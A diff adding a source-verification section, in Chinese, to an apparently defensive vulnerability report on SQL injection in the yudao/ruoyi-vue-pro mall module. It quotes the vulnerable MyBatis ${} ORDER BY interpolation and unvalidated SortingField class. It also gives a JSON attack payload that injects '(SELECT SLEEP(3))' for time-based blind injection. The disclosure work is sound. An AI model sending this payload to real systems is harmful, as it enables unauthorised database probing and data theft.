@@ -133,6 +133,74 @@ curl -X GET -H "Authorization: Bearer <admin_token>" \
 4. **XML `${}` 全面替换**：ORDER BY 方向使用 `<if test="order=='ASC'">ASC</if><if test="order=='DESC'">DESC</if>`
 5. **单元测试**：在 CI 中扫描所有包含 `${sortingField` 的 Mapper XML 强制修复
 
+## 源代码验证（已复现）
+
+yudao 是前后端分离的 Spring Boot 工程，Docker 部署需构建多个模块。以下通过**源代码静态分析**确认三处关键代码。
+
+### 验证1：BrokerageUserMapper.xml 原始插值确认
+
+**文件**：`yudao-module-mall/yudao-module-trade/src/main/resources/mapper/brokerage/BrokerageUserMapper.xml`（第 26-34 行）
+
+```xml
+<choose>
+    <when test="sortingField.field == 'userCount'">
+        ORDER BY brokerageUserCount ${sortingField.order}   ← 第 27 行：原始插值
+    </when>
+    <when test="sortingField.field == 'orderCount'">
+        ORDER BY brokerageOrderCount ${sortingField.order}  ← 第 30 行：原始插值
+    </when>
+    <when test="sortingField.field == 'price'">
+        ORDER BY brokeragePrice ${sortingField.order}       ← 第 33 行：原始插值
+    </when>
+    <otherwise>
+        ORDER BY bu.bind_user_time DESC
+    </otherwise>
+</choose>
+```
+
+`${sortingField.order}` 直接从用户请求中获取，没有任何枚举校验。
+
+### 验证2：SortingField 类无校验逻辑
+
+**文件**：`yudao-framework/yudao-common/src/main/java/cn/iocoder/yudao/framework/common/pojo/SortingField.java`
+
+```java
+@Data
+@NoArgsConstructor
+@AllArgsConstructor
+public class SortingField implements Serializable {
+    public static final String ORDER_ASC = "asc";
+    public static final String ORDER_DESC = "desc";
+
+    private String field;   // ← 无 @Pattern 或枚举约束
+    private String order;   // ← 无 @Pattern 或枚举约束，用户可传任意字符串
+}
+```
+
+### 验证3：请求 VO 中 sortingField 直接接收用户输入
+
+**文件**：`yudao-module-trade/.../AppBrokerageUserChildSummaryPageReqVO.java`（第 23 行）
+
+```java
+@Schema(description = "排序字段", example = "userCount")
+private SortingField sortingField;  // ← 直接反序列化用户 JSON，order 字段无约束
+```
+
+**攻击载荷**（App 层接口，任意已认证用户可触发）：
+```json
+{
+  "pageNo": 1,
+  "pageSize": 10,
+  "level": 1,
+  "sortingField": {
+    "field": "userCount",
+    "order": "ASC, (SELECT SLEEP(3))"
+  }
+}
+```
+
+生成 SQL：`ORDER BY brokerageUserCount ASC, (SELECT SLEEP(3))` — 时间盲注成立。
+
 ## 验证环境
 
 - 源代码：yudao-cloud / ruoyi-vue-pro 最新分支（静态代码分析）
